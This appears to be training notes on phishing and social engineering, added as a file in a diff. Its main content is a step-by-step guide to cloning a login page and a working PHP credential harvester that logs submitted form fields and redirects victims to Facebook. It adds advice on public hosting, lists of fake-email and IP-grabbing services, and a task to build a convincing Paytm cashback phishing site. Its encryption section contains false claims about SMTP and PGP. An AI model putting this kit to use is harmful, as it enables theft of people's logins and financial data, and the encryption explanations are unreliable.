@@ -1,0 +1,115 @@
+
+
+PHISHING ATTACKS
+================
+Phishing is a type of attack where a Attacker creates a Malicious web page globally hosted or locally hosted which seems legit/normal/original but makes for “phish” ie, lure the Victim making him/her to enter the sensitive or critical data which can be of any type eg. personal or financial and with the help of Phishing Attack.
+
+CREATION OF A PHISHING WEBPAGE
+===============================
+Workflow:
+= Opening any Social Networking Website and copy its Source Code - The Scripting Code of the Web Page.
+= Creating a PHP Page for getting the Data from the Phishing Page.
+= A text file to store the data of the Phishing page.
+
+Steps :
+=======
+ 
+= Open Any Legitimate Website and Right Click on it.
+= Go to the “View Page Source” option.
+= Copy The Source Code and Paste it In a Notepad File.
+= Find "Action=" (Action defines the next location the data has to go)
+= Replace The Field In The Above Step With Post.php
+= Save As the Copied File as webpage.html
+=Create A Post.php File for saving the data we get from the Phishing Page entered by the Victim and create a new text file through it for saving all the Data..
+= Save Both The Files In the Localhost Server.= 
+
+Creation of Post.php
+=====================
+<?php        //starting of a php code
+header ('Location: https://www.facebook.com');        //redirection to the original webpage 
+$handle = fopen("log.txt", "a");        //Creating a text file log.txt to store data & append it
+foreach($_POST as $variable => $value) {            //running of a loop until  we didn’t get the value
+   fwrite($handle, $variable);        //Writing the Variable Name
+   fwrite($handle, "=");        //To define the value of Equals to.
+   fwrite($handle, $value);        //For writing the Username of the data
+   fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+}        // end of loop
+fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+fclose($handle);        //saving and closing the file named log.txt
+exit;        // Exiting the PHP code
+?>        // End of the PHP Code
+
+
+Saving the Web Phishing Code and the Post.php in a same location in a folder inside the Localhost server.
+
+These Phishing Pages can be globally hosted via 000webhost.com and other open source servers also.
+----------------------------------------------------------------------------------------------------------------------------
+
+SOCIAL ENGINEERING
+==================
+Social Engineering is a term usually called for “Hacking done via Human Minds”.
+This is an art of Manipulating human minds so that they can spit out the Confidential Information. These types of Information can be any Personal or Financial Information. This attack can only be possible through “Human Stupidity”.
+Phishing is a sub-category of Social Engineering.
+
+Youtube Video for Social Engineering : https://www.youtube.com/watch?v=lc7scxvKQOo
+Social Engineering Free Pizza → https://www.youtube.com/watch?v=z68gZJwdAAg
+
+
+---------------------------------------------------------------------------------------------------------------------------- 
+
+Email Encryption
+=============
+What is encryption? 
+Encryption is a Method which converts Plain Text Data which can be readable and understand into a unreadable form of data which is Encoded and cannot be easily readable by humans.
+
+Email Encryption : When we use the service of SMTP and sends a Email to another person, it uses End to End Encryption Method which is having some Public Key, Private Key and some Algorithms.
+
+Public Key is that which can be easily accessible from a CA Server. A Private Key is that which our Authentication Server of the Web Service generates and it merges with the Public Key to Complete the Encryption Process. The algorithm defines the functionality by which a Encryption Method Works.
+
+PGP - Pretty Good Privacy
+====================
+Pretty Good Privacy or PGP is a popular program used to encrypt and decrypt email over the Internet, as well as authenticate messages with digital signatures and encrypted stored files. This encryption format developed by PGP is used by Emails and applications like Whatsapp nowadays which provides end to end security.
+
+Website -  https://encipher.it/
+
+
+IDN Homograph Attack
+=================
+
+A IDN homograph attack is based on standards of modern Internet that allows us to communicate in various multiple languages provided all over the globe. Different languages may contain different but very similar characters. So a Attacker lures and pranks with a Victim by these languages. Eg of Languages - Cyrillic Characters
+https://www.irongeek.com/homoglyph-attack-generator.php
+
+What a Attacker can do?
+===================
+Attackers can register their own domain names that are similar to the existing web addresses. 
+Then they can create their own websites that are, again, the same or very similar to the existing original sites (that usually belong to banks, corporations, email or news services).
+
+----------------------------------------------------------------------------------------------------------------------------
+
+Spear Phishing
+===========
+Spear Phishing Attacks are those in which a Attacker customize their attack emails with the target’s name, position, company, work phone number and other information in an attempt to trick the recipient into believing that they have a connection with the sender.
+The goal is the same as normal phishing which is luring the targeted victim into clicking on a malicious URL or email attachment, so that they will hand over their personal data.
+
+Eg. Mail from your Boss of your company.
+----------------------------------------------------------------------------------------------------------------------------
+
+Fake Emails
+=========
+A fake email means a email generated by fake dummy server from which a attacker can generate there email and customize it to lure and attracts a Victim for Spear Phishing and other activities.
+
+Website - https://emkei.cz/
+
+----------------------------------------------------------------------------------------------------------------------------
+Emails Tracing and Tracking
+=====================
+Demo of whoreadme.com
+Demo of IP Grabber
+http://www.fuglekos.com/ip-grabber/index.html
+https://grabify.link/
+http://whatstheirip.com
+------------------------------------------------------------------------------------------------------------------------------------
+
+TASK
+=====
+ Create a phishing website for paytm cashback and host the same in localhost which will be convincing to your trainer.
